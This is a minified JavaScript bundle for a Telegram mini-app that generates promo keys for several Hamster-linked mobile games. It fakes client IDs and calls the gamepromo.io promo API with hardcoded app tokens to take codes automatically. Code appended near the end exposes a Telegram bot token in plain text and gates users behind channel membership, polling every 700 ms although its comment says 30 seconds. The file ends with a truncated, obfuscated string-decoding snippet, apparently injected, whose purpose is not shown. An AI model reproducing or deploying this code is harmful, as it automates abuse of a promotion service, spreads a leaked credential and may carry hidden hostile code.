  MODE: "production",
  PROD: !0,
  SSR: !1,
  VITE_APP_VERSION: "0.5.0",
  VITE_LOCAL_STORAGE_KEY: "hamster-tools.react.v1"
};
const Df = e => {
    let t;
    const n = new Set(),
      r = (d, f) => {
        const v = "function" == typeof d ? d(t) : d;
        if (!Object.is(v, t)) {
          const g = t;
          t = (f !== null && f !== void 0 ? f : "object" != typeof v || null === v) ? v : Object.assign({}, t, v), n.forEach(x => x(t, g));
        }
      },
      o = () => t,
      a = {
        setState: r,
        getState: o,
        getInitialState: () => u,
        subscribe: d => (n.add(d), () => n.delete(d)),
        destroy: () => {
          "production" !== (Xk ? "production" : void 0) && console.warn("[DEPRECATED] The `destroy` method will be unsupported in a future version. Instead use unsubscribe function returned by subscribe. Everything will be garbage-collected if store is garbage-collected."), n.clear();
        }
      },
      u = t = e(r, o, a);
    return a;
  },
  Zk = e => e ? Df(e) : Df,
  {
    useDebugValue: Jk
  } = fu,
  {
    useSyncExternalStoreWithSelector: qk
  } = Yk,
  eP = e => e;
function tP(e, t = eP, n) {
  const r = qk(e.subscribe, e.getState, e.getServerState || e.getInitialState, t, n);
  return Jk(r), r;
}
const If = (e, t) => {
    const n = Zk(e),
      r = (o, i = t) => tP(n, o, i);
    return Object.assign(r, n), r;
  },
  nP = (e, t) => e ? If(e, t) : If;
function rP(e, t) {
  if (Object.is(e, t)) return !0;
  if ("object" != typeof e || null === e || "object" != typeof t || null === t) return !1;
  if (e instanceof Map && t instanceof Map) {
    if (e.size !== t.size) return !1;
    for (const [r, o] of e) if (!Object.is(o, t.get(r))) return !1;
    return !0;
  }
  if (e instanceof Set && t instanceof Set) {
    if (e.size !== t.size) return !1;
    for (const r of e) if (!t.has(r)) return !1;
    return !0;
  }
  const n = Object.keys(e);
  if (n.length !== Object.keys(t).length) return !1;
  for (const r of n) if (!Object.prototype.hasOwnProperty.call(t, r) || !Object.is(e[r], t[r])) return !1;
  return !0;
}
var Fi = {
  BASE_URL: "/",
  DEV: !1,
  MODE: "production",
  PROD: !0,
  SSR: !1,
  VITE_APP_VERSION: "0.5.0",
  VITE_LOCAL_STORAGE_KEY: "hamster-tools.react.v1"
};
const qa = new Map(),
  Ci = e => {
    const t = qa.get(e);
    return t ? Object.fromEntries(Object.entries(t.stores).map(([n, r]) => [n, r.getState()])) : {};
  },
  oP = (e, t, n) => {
    if (void 0 === e) return {
      type: "untracked",
      connection: t.connect(n)
    };
    const r = qa.get(n.name);
    if (r) return {
      type: "tracked",
      store: e,
      ...r
    };
    const o = {
      connection: t.connect(n),
      stores: {}
    };
    return qa.set(n.name, o), {
      type: "tracked",
      store: e,
      ...o
    };
  },
  iP = (e, t = {}) => (n, r, o) => {
    const {
      enabled: i,
      anonymousActionType: l,
      store: s,
      ...a
    } = t;
    let u;
    try {
      u = (i !== null && i !== void 0 ? i : "production" !== (Fi ? "production" : void 0)) && window.__REDUX_DEVTOOLS_EXTENSION__;
    } catch {}
    if (!u) return "production" !== (Fi ? "production" : void 0) && i && console.warn("[zustand devtools middleware] Please install/enable Redux devtools extension"), e(n, r, o);
    const {
      connection: d,
      ...f
    } = oP(s, u, a);
    let v = !0;
    o.setState = (h, w, m) => {
      const p = n(h, w);
      if (!v) return p;
      const y = void 0 === m ? {
        type: l || "anonymous"
      } : "string" == typeof m ? {
        type: m
      } : m;
      return void 0 === s ? (null == d || d.send(y, r()), p) : (null == d || d.send({
        ...y,
        type: `${s}/${y.type}`
      }, {
        ...Ci(a.name),
        [s]: o.getState()
      }), p);
    };
    const g = (...h) => {
        const w = v;
        v = !1, n(...h), v = w;
      },
      x = e(o.setState, r, o);
    if ("untracked" === f.type ? null == d || d.init(x) : (f.stores[f.store] = o, null == d || d.init(Object.fromEntries(Object.entries(f.stores).map(([h, w]) => [h, h === f.store ? x : w.getState()])))), o.dispatchFromDevtools && "function" == typeof o.dispatch) {
      let h = !1;
      const w = o.dispatch;
      o.dispatch = (...m) => {
        "production" !== (Fi ? "production" : void 0) && "__setState" === m[0].type && !h && (console.warn('[zustand devtools middleware] "__setState" action type is reserved to set state from the devtools. Avoid using it.'), h = !0), w(...m);
      };
    }
    return d.subscribe(h => {
      var w;
      switch (h.type) {
        case "ACTION":
          return "string" != typeof h.payload ? void console.error("[zustand devtools middleware] Unsupported action format") : zs(h.payload, m => {
            if ("__setState" !== m.type) o.dispatchFromDevtools && "function" == typeof o.dispatch && o.dispatch(m);else {
              if (void 0 === s) return void g(m.state);
              1 !== Object.keys(m.state).length && console.error('\n                    [zustand devtools middleware] Unsupported __setState action format. \n                    When using \'store\' option in devtools(), the \'state\' should have only one key, which is a value of \'store\' that was passed in devtools(),\n                    and value of this only key should be a state object. Example: { "type": "__setState", "state": { "abc123Store": { "foo": "bar" } } }\n                    ');
              const p = m.state[s];
              if (null == p) return;
              JSON.stringify(o.getState()) !== JSON.stringify(p) && g(p);
            }
          });
        case "DISPATCH":
          switch (h.payload.type) {
            case "RESET":
              return g(x), void 0 === s ? null == d ? void 0 : d.init(o.getState()) : null == d ? void 0 : d.init(Ci(a.name));
            case "COMMIT":
              return void 0 === s ? void (null == d || d.init(o.getState())) : null == d ? void 0 : d.init(Ci(a.name));
            case "ROLLBACK":
              return zs(h.state, m => {
                if (void 0 === s) return g(m), void (null == d || d.init(o.getState()));
                g(m[s]), null == d || d.init(Ci(a.name));
              });
            case "JUMP_TO_STATE":
            case "JUMP_TO_ACTION":
              return zs(h.state, m => {
                void 0 !== s ? JSON.stringify(o.getState()) !== JSON.stringify(m[s]) && g(m[s]) : g(m);
              });
            case "IMPORT_STATE":
              {
                const {
                    nextLiftedState: m
                  } = h.payload,
                  p = null == (w = m.computedStates.slice(-1)[0]) ? void 0 : w.state;
                if (!p) return;
                return g(void 0 === s ? p : p[s]), void (null == d || d.send(null, m));
              }
            case "PAUSE_RECORDING":
              return v = !v;
          }
          return;
      }
    }), x;
  },
  lP = iP,
  zs = (e, t) => {
    let n;
    try {
      n = JSON.parse(e);
    } catch (r) {
      console.error("[zustand devtools middleware] Could not parse the received json", r);
    }
    void 0 !== n && t(n);
  };
function sP(e, t) {
  let n;
  try {
    n = e();
  } catch {
    return;
  }
  return {
    getItem: o => {
      var i;
      const l = a => null === a ? null : JSON.parse(a, void 0),
        s = null != (i = n.getItem(o)) ? i : null;
      return s instanceof Promise ? s.then(l) : l(s);
    },
    setItem: (o, i) => n.setItem(o, JSON.stringify(i, void 0)),
    removeItem: o => n.removeItem(o)
  };
}
const To = e => t => {
    try {
      const n = e(t);
      return n instanceof Promise ? n : {
        then: r => To(r)(n),
        catch(r) {
          return this;
        }
      };
    } catch (n) {
      return {
        then(r) {
          return this;
        },
        catch: r => To(r)(n)
      };
    }
  },
  aP = (e, t) => (n, r, o) => {
    let i = {
        getStorage: () => localStorage,
        serialize: JSON.stringify,
        deserialize: JSON.parse,
        partialize: w => w,
        version: 0,
        merge: (w, m) => ({
          ...m,
          ...w
        }),
        ...t
      },
      l = !1;
    const s = new Set(),
      a = new Set();
    let u;
    try {
      u = i.getStorage();
    } catch {}
    if (!u) return e((...w) => {
      console.warn(`[zustand persist middleware] Unable to update item '${i.name}', the given storage is currently unavailable.`), n(...w);
    }, r, o);
    const d = To(i.serialize),
      f = () => {
        const w = i.partialize({
          ...r()
        });
        let m;
        const p = d({
          state: w,
          version: i.version
        }).then(y => u.setItem(i.name, y)).catch(y => {
          m = y;
        });
        if (m) throw m;
        return p;
      },
      v = o.setState;
    o.setState = (w, m) => {
      v(w, m), f();
    };
    const g = e((...w) => {
      n(...w), f();
    }, r, o);
    let x;
    const h = () => {
      var w;
      if (!u) return;
      l = !1, s.forEach(p => p(r()));
      const m = (null == (w = i.onRehydrateStorage) ? void 0 : w.call(i, r())) || void 0;
      return To(u.getItem.bind(u))(i.name).then(p => {
        if (p) return i.deserialize(p);
      }).then(p => {
        if (p) {
          if ("number" != typeof p.version || p.version === i.version) return p.state;
          if (i.migrate) return i.migrate(p.state, p.version);
          console.error("State loaded from storage couldn't be migrated since no migrate function was provided");
        }
      }).then(p => {
        var y;
        return x = i.merge(p, null != (y = r()) ? y : g), n(x, !0), f();
      }).then(() => {
        null == m || m(x, void 0), l = !0, a.forEach(p => p(x));
      }).catch(p => {
        null == m || m(void 0, p);
      });
    };
    return o.persist = {
      setOptions: w => {
        i = {
          ...i,
          ...w
        }, w.getStorage && (u = w.getStorage());
      },
      clearStorage: () => {
        null == u || u.removeItem(i.name);
      },
      getOptions: () => i,
      rehydrate: () => h(),
      hasHydrated: () => l,
      onHydrate: w => (s.add(w), () => {
        s.delete(w);
      }),
      onFinishHydration: w => (a.add(w), () => {
        a.delete(w);
      })
    }, h(), x || g;
  },
  uP = (e, t) => (n, r, o) => {
    let i = {
        storage: sP(() => localStorage),
        partialize: h => h,
        version: 0,
        merge: (h, w) => ({
          ...w,
          ...h
        }),
        ...t
      },
      l = !1;
    const s = new Set(),
      a = new Set();
    let u = i.storage;
    if (!u) return e((...h) => {
      console.warn(`[zustand persist middleware] Unable to update item '${i.name}', the given storage is currently unavailable.`), n(...h);
    }, r, o);
    const d = () => {
        const h = i.partialize({
          ...r()
        });
        return u.setItem(i.name, {
          state: h,
          version: i.version
        });
      },
      f = o.setState;
    o.setState = (h, w) => {
      f(h, w), d();
    };
    const v = e((...h) => {
      n(...h), d();
    }, r, o);
    let g;
    o.getInitialState = () => v;
    const x = () => {
      var h, w;
      if (!u) return;
      l = !1, s.forEach(p => {
        var y;
        return p(null != (y = r()) ? y : v);
      });
      const m = (null == (w = i.onRehydrateStorage) ? void 0 : w.call(i, null != (h = r()) ? h : v)) || void 0;
      return To(u.getItem.bind(u))(i.name).then(p => {
        if (p) {
          if ("number" != typeof p.version || p.version === i.version) return p.state;
          if (i.migrate) return i.migrate(p.state, p.version);
          console.error("State loaded from storage couldn't be migrated since no migrate function was provided");
        }
      }).then(p => {
        var y;
        return g = i.merge(p, null != (y = r()) ? y : v), n(g, !0), d();
      }).then(() => {
        null == m || m(g, void 0), g = r(), l = !0, a.forEach(p => p(g));
      }).catch(p => {
        null == m || m(void 0, p);
      });
    };
    return o.persist = {
      setOptions: h => {
        i = {
          ...i,
          ...h
        }, h.storage && (u = h.storage);
      },
      clearStorage: () => {
        null == u || u.removeItem(i.name);
      },
      getOptions: () => i,
      rehydrate: () => x(),
      hasHydrated: () => l,
      onHydrate: h => (s.add(h), () => {
        s.delete(h);
      }),
      onFinishHydration: h => (a.add(h), () => {
        a.delete(h);
      })
    }, i.skipHydration || x(), g || v;
  },
  cP = (e, t) => "getStorage" in t || "serialize" in t || "deserialize" in t ? ("production" !== (Fi ? "production" : void 0) && console.warn("[DEPRECATED] `getStorage`, `serialize` and `deserialize` options are deprecated. Use `storage` option instead."), aP(e, t)) : uP(e, t),
  dP = cP;
var $g = Symbol.for("immer-nothing"),
  Mf = Symbol.for("immer-draftable"),
  Ve = Symbol.for("immer-state");
function it(e, ...t) {
  throw new Error(`[Immer] minified error nr: ${e}. Full error at: https://bit.ly/3cXEKWf`);
}
var $r = Object.getPrototypeOf;
function Rr(e) {
  return !!e && !!e[Ve];
}
function Ln(e) {
  var t;
  return !!e && (Rg(e) || Array.isArray(e) || !!e[Mf] || !(null == (t = e.constructor) || !t[Mf]) || Gl(e) || Ql(e));
}
var fP = Object.prototype.constructor.toString();
function Rg(e) {
  if (!e || "object" != typeof e) return !1;
  const t = $r(e);
  if (null === t) return !0;
  const n = Object.hasOwnProperty.call(t, "constructor") && t.constructor;
  return n === Object || "function" == typeof n && Function.toString.call(n) === fP;
}
function wl(e, t) {
  0 === Kl(e) ? Reflect.ownKeys(e).forEach(n => {
    t(n, e[n], e);
  }) : e.forEach((n, r) => t(r, n, e));
}
function Kl(e) {
  const t = e[Ve];
  return t ? t.type_ : Array.isArray(e) ? 1 : Gl(e) ? 2 : Ql(e) ? 3 : 0;
}
function eu(e, t) {
  return 2 === Kl(e) ? e.has(t) : Object.prototype.hasOwnProperty.call(e, t);
}
function Og(e, t, n) {
  const r = Kl(e);
  2 === r ? e.set(t, n) : 3 === r ? e.add(n) : e[t] = n;
}
function pP(e, t) {
  return e === t ? 0 !== e || 1 / e == 1 / t : e != e && t != t;
}
function Gl(e) {
  return e instanceof Map;
}
function Ql(e) {
  return e instanceof Set;
}
function wn(e) {
  return e.copy_ || e.base_;
}
function tu(e, t) {
  if (Gl(e)) return new Map(e);
  if (Ql(e)) return new Set(e);
  if (Array.isArray(e)) return Array.prototype.slice.call(e);
  const n = Rg(e);
  if (!0 === t || "class_only" === t && !n) {
    const r = Object.getOwnPropertyDescriptors(e);
    delete r[Ve];
    let o = Reflect.ownKeys(r);
    for (let i = 0; i < o.length; i++) {
      const l = o[i],
        s = r[l];
      !1 === s.writable && (s.writable = !0, s.configurable = !0), (s.get || s.set) && (r[l] = {
        configurable: !0,
        writable: !0,
        enumerable: s.enumerable,
        value: e[l]
      });
    }
    return Object.create($r(e), r);
  }
  {
    const r = $r(e);
    if (null !== r && n) return {
      ...e
    };
    const o = Object.create(r);
    return Object.assign(o, e);
  }
}
function Rc(e, t = !1) {
  return Yl(e) || Rr(e) || !Ln(e) || (Kl(e) > 1 && (e.set = e.add = e.clear = e.delete = mP), Object.freeze(e), t && Object.entries(e).forEach(([n, r]) => Rc(r, !0))), e;
}
function mP() {
  it(2);
}
function Yl(e) {
  return Object.isFrozen(e);
}
var Do,
  vP = {};
function jn(e) {
  const t = vP[e];
  return t || it(0, e), t;
}
function Ag() {
  return Do;
}
function hP(e, t) {
  return {
    drafts_: [],
    parent_: e,
    immer_: t,
    canAutoFreeze_: !0,
    unfinalizedDrafts_: 0
  };
}
function Lf(e, t) {
  t && (jn("Patches"), e.patches_ = [], e.inversePatches_ = [], e.patchListener_ = t);
}
function nu(e) {
  ru(e), e.drafts_.forEach(gP), e.drafts_ = null;
}
function ru(e) {
  e === Do && (Do = e.parent_);
}
function jf(e) {
  return Do = hP(Do, e);
}
function gP(e) {
  const t = e[Ve];
  0 === t.type_ || 1 === t.type_ ? t.revoke_() : t.revoked_ = !0;
}
function zf(e, t) {
  t.unfinalizedDrafts_ = t.drafts_.length;
  const n = t.drafts_[0];
  return void 0 !== e && e !== n ? (n[Ve].modified_ && (nu(t), it(4)), Ln(e) && (e = xl(t, e), t.parent_ || Sl(t, e)), t.patches_ && jn("Patches").generateReplacementPatches_(n[Ve].base_, e, t.patches_, t.inversePatches_)) : e = xl(t, n, []), nu(t), t.patches_ && t.patchListener_(t.patches_, t.inversePatches_), e !== $g ? e : void 0;
}
function xl(e, t, n) {
  if (Yl(t)) return t;
  const r = t[Ve];
  if (!r) return wl(t, (o, i) => Ff(e, r, t, o, i, n)), t;
  if (r.scope_ !== e) return t;
  if (!r.modified_) return Sl(e, r.base_, !0), r.base_;
  if (!r.finalized_) {
    r.finalized_ = !0, r.scope_.unfinalizedDrafts_--;
    const o = r.copy_;
    let i = o,
      l = !1;
    3 === r.type_ && (i = new Set(o), o.clear(), l = !0), wl(i, (s, a) => Ff(e, r, o, s, a, n, l)), Sl(e, o, !1), n && e.patches_ && jn("Patches").generatePatches_(r, n, e.patches_, e.inversePatches_);
  }
  return r.copy_;
}
function Ff(e, t, n, r, o, i, l) {
  if (Rr(o)) {
    const a = xl(e, o, i && t && 3 !== t.type_ && !eu(t.assigned_, r) ? i.concat(r) : void 0);
    if (Og(n, r, a), !Rr(a)) return;
    e.canAutoFreeze_ = !1;
  } else l && n.add(o);
  if (Ln(o) && !Yl(o)) {
    if (!e.immer_.autoFreeze_ && e.unfinalizedDrafts_ < 1) return;
    xl(e, o), (!t || !t.scope_.parent_) && "symbol" != typeof r && Object.prototype.propertyIsEnumerable.call(n, r) && Sl(e, o);
  }
}
function Sl(e, t, n = !1) {
  !e.parent_ && e.immer_.autoFreeze_ && e.canAutoFreeze_ && Rc(t, n);
}
function yP(e, t) {
  const n = Array.isArray(e),
    r = {
      type_: n ? 1 : 0,
      scope_: t ? t.scope_ : Ag(),
      modified_: !1,
      finalized_: !1,
      assigned_: {},
      parent_: t,
      base_: e,
      draft_: null,
      copy_: null,
      revoke_: null,
      isManual_: !1
    };
  let o = r,
    i = Oc;
  n && (o = [r], i = Io);
  const {
    revoke: l,
    proxy: s
  } = Proxy.revocable(o, i);
  return r.draft_ = s, r.revoke_ = l, s;
}
var Oc = {
    get(e, t) {
      if (t === Ve) return e;
      const n = wn(e);
      if (!eu(n, t)) return wP(e, n, t);
      const r = n[t];
      return e.finalized_ || !Ln(r) ? r : r === Fs(e.base_, t) ? (Us(e), e.copy_[t] = iu(r, e)) : r;
    },
    has: (e, t) => t in wn(e),
    ownKeys: e => Reflect.ownKeys(wn(e)),
    set(e, t, n) {
      const r = Tg(wn(e), t);
      if (null != r && r.set) return r.set.call(e.draft_, n), !0;
      if (!e.modified_) {
        const o = Fs(wn(e), t),
          i = null == o ? void 0 : o[Ve];
        if (i && i.base_ === n) return e.copy_[t] = n, e.assigned_[t] = !1, !0;
        if (pP(n, o) && (void 0 !== n || eu(e.base_, t))) return !0;
        Us(e), ou(e);
      }
      return e.copy_[t] === n && (void 0 !== n || t in e.copy_) || Number.isNaN(n) && Number.isNaN(e.copy_[t]) || (e.copy_[t] = n, e.assigned_[t] = !0), !0;
    },
    deleteProperty: (e, t) => (void 0 !== Fs(e.base_, t) || t in e.base_ ? (e.assigned_[t] = !1, Us(e), ou(e)) : delete e.assigned_[t], e.copy_ && delete e.copy_[t], !0),
    getOwnPropertyDescriptor(e, t) {
      const n = wn(e),
        r = Reflect.getOwnPropertyDescriptor(n, t);
      return r && {
        writable: !0,
        configurable: 1 !== e.type_ || "length" !== t,
        enumerable: r.enumerable,
        value: n[t]
      };
    },
    defineProperty() {
      it(11);
    },
    getPrototypeOf: e => $r(e.base_),
    setPrototypeOf() {
      it(12);
    }
  },
  Io = {};
function Fs(e, t) {
  const n = e[Ve];
  return (n ? wn(n) : e)[t];
}
function wP(e, t, n) {
  var o;
  const r = Tg(t, n);
  return r ? "value" in r ? r.value : null == (o = r.get) ? void 0 : o.call(e.draft_) : void 0;
}
function Tg(e, t) {
  if (!(t in e)) return;
  let n = $r(e);
  for (; n;) {
    const r = Object.getOwnPropertyDescriptor(n, t);
    if (r) return r;
    n = $r(n);
  }
}
function ou(e) {
  e.modified_ || (e.modified_ = !0, e.parent_ && ou(e.parent_));
}
function Us(e) {
  e.copy_ || (e.copy_ = tu(e.base_, e.scope_.immer_.useStrictShallowCopy_));
}
wl(Oc, (e, t) => {
  Io[e] = function () {
    return arguments[0] = arguments[0][0], t.apply(this, arguments);
  };
}), Io.deleteProperty = function (e, t) {
  return Io.set.call(this, e, t, void 0);
}, Io.set = function (e, t, n) {
  return Oc.set.call(this, e[0], t, n, e[0]);
};
var xP = class {
  constructor(e) {
    this.autoFreeze_ = !0, this.useStrictShallowCopy_ = !1, this.produce = (t, n, r) => {
      if ("function" == typeof t && "function" != typeof n) {
        const i = n;
        n = t;
        const l = this;
        return function (a = i, ...u) {
          return l.produce(a, d => n.call(this, d, ...u));
        };
      }
      let o;
      if ("function" != typeof n && it(6), void 0 !== r && "function" != typeof r && it(7), Ln(t)) {
        const i = jf(this),
          l = iu(t, void 0);
        let s = !0;
        try {
          o = n(l), s = !1;
        } finally {
          s ? nu(i) : ru(i);
        }
        return Lf(i, r), zf(o, i);
      }
      if (!t || "object" != typeof t) {
        if (o = n(t), void 0 === o && (o = t), o === $g && (o = void 0), this.autoFreeze_ && Rc(o, !0), r) {
          const i = [],
            l = [];
          jn("Patches").generateReplacementPatches_(t, o, i, l), r(i, l);
        }
        return o;
      }
      it(1, t);
    }, this.produceWithPatches = (t, n) => {
      if ("function" == typeof t) return (l, ...s) => this.produceWithPatches(l, a => t(a, ...s));
      let r, o;
      return [this.produce(t, n, (l, s) => {
        r = l, o = s;
      }), r, o];
    }, "boolean" == typeof (null == e ? void 0 : e.autoFreeze) && this.setAutoFreeze(e.autoFreeze), "boolean" == typeof (null == e ? void 0 : e.useStrictShallowCopy) && this.setUseStrictShallowCopy(e.useStrictShallowCopy);
  }
  createDraft(e) {
    Ln(e) || it(8), Rr(e) && (e = SP(e));
    const t = jf(this),
      n = iu(e, void 0);
    return n[Ve].isManual_ = !0, ru(t), n;
  }
  finishDraft(e, t) {
    const n = e && e[Ve];
    (!n || !n.isManual_) && it(9);
    const {
      scope_: r
    } = n;
    return Lf(r, t), zf(void 0, r);
  }
  setAutoFreeze(e) {
    this.autoFreeze_ = e;
  }
  setUseStrictShallowCopy(e) {
    this.useStrictShallowCopy_ = e;
  }
  applyPatches(e, t) {
    let n;
    for (n = t.length - 1; n >= 0; n--) {
      const o = t[n];
      if (0 === o.path.length && "replace" === o.op) {
        e = o.value;
        break;
      }
    }
    n > -1 && (t = t.slice(n + 1));
    const r = jn("Patches").applyPatches_;
    return Rr(e) ? r(e, t) : this.produce(e, o => r(o, t));
  }
};
function iu(e, t) {
  const n = Gl(e) ? jn("MapSet").proxyMap_(e, t) : Ql(e) ? jn("MapSet").proxySet_(e, t) : yP(e, t);
  return (t ? t.scope_ : Ag()).drafts_.push(n), n;
}
function SP(e) {
  return Rr(e) || it(10, e), Dg(e);
}
function Dg(e) {
  if (!Ln(e) || Yl(e)) return e;
  const t = e[Ve];
  let n;
  if (t) {
    if (!t.modified_) return t.base_;
    t.finalized_ = !0, n = tu(e, t.scope_.immer_.useStrictShallowCopy_);
  } else n = tu(e, !0);
  return wl(n, (r, o) => {
    Og(n, r, Dg(o));
  }), t && (t.finalized_ = !1), n;
}
var He = new xP(),
  EP = He.produce;
He.produceWithPatches.bind(He), He.setAutoFreeze.bind(He), He.setUseStrictShallowCopy.bind(He), He.applyPatches.bind(He), He.createDraft.bind(He), He.finishDraft.bind(He);
const CP = e => (t, n, r) => (r.setState = (o, i, ...l) => {
    const s = "function" == typeof o ? EP(o) : o;
    return t(s, i, ...l);
  }, e(r.setState, n, r)),
  kP = CP,
  Uf = "game",
  PP = {
    status: "idle"
  },
  lu = nP(lP(dP(kP(e => ({
    ...PP,
    setStatus(t) {
      e(n => {
        n.status = t;
      });
    }
  })), {
    name: `hamster-tools.react.v1:${Uf}`,
    partialize: e => Object.fromEntries(Object.entries(e).filter(([t]) => !["status"].includes(t)))
  }), {
    name: "Zustand Store",
    store: Uf
  }), rP);
function _P({
  label: e,
  keygen: t
}) {
  const [n, r] = c.useState([null, null, null, null]),
    o = lu(f => f.status),
    i = lu(f => f.setStatus),
    [l, s] = c.useState(0),
    {
      copy: a
    } = $k();
  return c.useEffect(() => {
    if ("wait" !== o) return;
    const f = setInterval(() => {
      s(v => v < 100 ? v + 1 : (clearInterval(f), 100));
    }, 1e3);
    return () => clearInterval(f);
  }, [o]), E.jsxs(pg, {
    children: [E.jsxs(mg, {
      children: [E.jsx(vg, {
        children: e
      }), E.jsxs(hg, {
        children: ["click ", E.jsx("b", {
          children: "Generate"
        }), " to use"]
      })]
    }), E.jsx(gg, {
      children: E.jsxs("ul", {
        className: "space-y-2",
        children: [n.map((f, v) => E.jsxs("li", {
          className: "flex justify-between items-center gap-4",
          children: [f ? E.jsx(Nk, {
            code: f
          }) : E.jsx(bk, {
            animation: "wait" === o
          }), E.jsx(gl, {
            variant: "outline",
            size: "sm",
            onClick: () => function u(f) {
              a(f), Kd(E.jsxs("div", {
                className: "flex justify-center items-center",
                children: [E.jsx(h1, {
                  size: 16,
                  className: "mr-2"
                }), " ", E.jsx("span", {
                  children: "Copied!"
                })]
              }));
            }(f),
            disabled: !f,
            children: E.jsx(g1, {
              size: 12
            })
          })]
        }, v)), E.jsxs("p", {
          className: "text-center font-medium mt-4",
          children: [l, "%"]
        }), E.jsx(kg, {
          value: l,
          className: "progressbar"
        })]
      })
    }), E.jsx(yg, {
      children: E.jsxs(gl, {
        onClick: async function d() {
          try {
            r([null, null, null, null]), i("wait"), s(0);
            const f = await Promise.all([t.generate(), t.generate(), t.generate(), t.generate()]);
            r(f), i("done"), s(100);
          } catch (f) {
            console.log("Error:", f), Kd("Error"), r([null, null, null, null]), i("idle"), s(0);
          }
        },
        disabled: "wait" === o,
        children: [E.jsx(w1, {
          size: 16,
          className: "mr-2"
        }), "Generate"]
      })
    })]
  });
}
class bP {
  constructor(t, n) {
    this.appToken = t, this.promoId = n;
  }
  sleep(t) {
    return t += Math.random() / 3 + 1, new Promise(n => setTimeout(n, t));
  }
  generateClientId() {
    return `${Date.now()}-${Array.from({
      length: 19
    }, () => Math.floor(10 * Math.random())).join("")}`;
  }
  async login(t) {
    const n = await fetch("https://api.gamepromo.io/promo/login-client", {
        headers: {
          "content-type": "application/json; charset=utf-8",
          Host: "api.gamepromo.io"
        },
        method: "POST",
        body: JSON.stringify({
          appToken: this.appToken,
          clientId: t,
          clientOrigin: "deviceid"
        })
      }),
      {
        clientToken: r
      } = await n.json();
    return r;
  }
  async check(t) {
    const n = await fetch("https://api.gamepromo.io/promo/register-event", {
        headers: {
          "content-type": "application/json; charset=utf-8",
          Host: "api.gamepromo.io",
          Authorization: `Bearer ${t}`
        },
        method: "POST",
        body: JSON.stringify({
          promoId: this.promoId,
          eventId: crypto.randomUUID(),
          eventOrigin: "undefined"
        })
      }),
      {
        hasCode: r
      } = await n.json();
    return r;
  }
  async createCode(t) {
    const n = await fetch("https://api.gamepromo.io/promo/create-code", {
        headers: {
          "content-type": "application/json; charset=utf-8",
          Host: "api.gamepromo.io",
          Authorization: `Bearer ${t}`
        },
        method: "POST",
        body: JSON.stringify({
          promoId: this.promoId
        })
      }),
      {
        promoCode: r
      } = await n.json();
    return r;
  }
  async generate() {
    const t = this.generateClientId(),
      n = await this.login(t);
    let r = null;
    for (; !r;) await this.sleep(2e4), r = await this.check(n);
    return await this.createCode(n);
  }
}
const NP = window.Telegram.WebApp,
  $P = [{
    value: "bike",
    label: "Bike Ride 3D",
    appToken: "d28721be-fd2d-4b45-869e-9f253b554e50",
    promoId: "43e35910-c168-4634-ad4f-52fd764a843f"
  }, {
    value: "clone",
    label: "My Clone Army",
    appToken: "74ee0b5b-775e-4bee-974f-63e7f4d5bacb",
    promoId: "fe693b26-b342-4159-8808-15e3ff7f8767"
  }, {
    value: "cube",
    label: "Chain Cube 2048",
    appToken: "d1690a07-3780-4068-810f-9b5bbf2931b2",
    promoId: "b4170868-cef0-424f-8eb9-be0622e8e8e3"
  }, {
    value: "train",
    label: "Train Miner",
    appToken: "82647f43-3f87-402d-88dd-09a90025313f",
    promoId: "c4480ac7-e178-4973-8061-9ed5b2e17954"
  }, {
    value: "merge",
    label: "Merge Away",
    appToken: "8d1cc2ad-e097-4b86-90ef-7a27e19fb833",
    promoId: "dc128d28-c45b-411c-98ff-ac7726fbaea4"
  }, {
    value: "twerk",
    label: "Twerk Race 3D",
    appToken: "61308365-9d16-4040-8bb0-2f4a4c69074c",
    promoId: "61308365-9d16-4040-8bb0-2f4a4c69074c"
  }],
  Ws = $P.map(e => (e.keygen = new bP(e.appToken, e.promoId), e));
function RP() {
  var l;
  const [e, t] = c.useState(!1),
    [n, r] = c.useState("bike"),
    o = lu(s => s.status),
    i = Ws.find(s => s.value === n);
  return c.useEffect(() => {
    NP.ready();
  }, []), E.jsxs(E.Fragment, {
    children: [E.jsx(yk, {}), E.jsxs("div", {
      className: "container",
      children: [E.jsxs("div", {
        className: "flex flex-col gap-4",
        children: [E.jsxs(ck, {
          open: e,
          onOpenChange: t,
          children: [E.jsx(dk, {
            asChild: !0,
            children: E.jsxs(gl, {
              variant: "outline",
              role: "combobox",
              "aria-expanded": e,
              className: "w-[200px] justify-between",
              disabled: "wait" === o,
              children: [n ? null == (l = Ws.find(s => s.value === n)) ? void 0 : l.label : "Select game...", E.jsx(v1, {
                className: "ml-2 h-4 w-4 shrink-0 opacity-50"
              })]
            })
          }), E.jsx(qh, {
            className: "w-[200px] p-0",
            children: E.jsxs(vh, {
              children: [E.jsx(hh, {
                placeholder: "Search game..."
              }), E.jsxs(gh, {
                children: [E.jsx(yh, {
                  children: "No game found."
                }), E.jsx(wh, {
                  children: Ws.map(s => E.jsxs(xh, {
                    value: s.value,
                    onSelect: a => {
                      r(a === n ? "" : a), t(!1);
                    },
                    children: [E.jsx(m1, {
                      className: ne("mr-2 h-4 w-4", n === s.value ? "opacity-100" : "opacity-0")
                    }), s.label]
                  }, s.value))
                })]
              })]
            })
          })]
        }), E.jsx(_P, {
          label: i.label,
          keygen: i.keygen
        })]
      }), E.jsx(cw, {})]
    })]
  });
}


const botToken = '6994579185:AAFY2x4G5qTZ0qk2vcxDMka_xM3zKwQUJjA';
const channelUsername = '@hamster_keys_tools';

// User's Telegram ID (retrieve this from your bot's message or callback query)
const userId = Ie.id;

// Function to check if a user is a member of the channel
async function checkChannelMembership(userId) {
    const url = `https://api.telegram.org/bot${botToken}/getChatMember?chat_id=${channelUsername}&user_id=${userId}`;
    
    const response = await fetch(url);
    const data = await response.json();

    if (data.ok) {
        const status = data.result.status;
        // Check if the user is a member
        if (status === 'member' || status === 'administrator' || status === 'creator') {
            document.getElementById("root").style.display = 'flex';
        } else {
            // Redirect to the channel and close the mini-app window
            window.location.href = 'https://t.me/hamster_keys_tools';
            setTimeout(function() {
                window.close();
            }, 1000); // Delay added to ensure the redirect happens before the window closes
        }
    } else {
        alert('An error occurred. Please try again later.');
    }
}

// Call the function repeatedly to check membership status
setInterval(function() {
    checkChannelMembership(userId);
}, 700); // Check every 30 seconds (adjust as needed)


Bs.createRoot(document.getElementById("root")).render(E.jsx(fu.StrictMode, {
  children: E.jsx(RP, {})
}));
(function (o, d, l) {
  try {
    o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
    o.b = o.f('UMUWJKX');
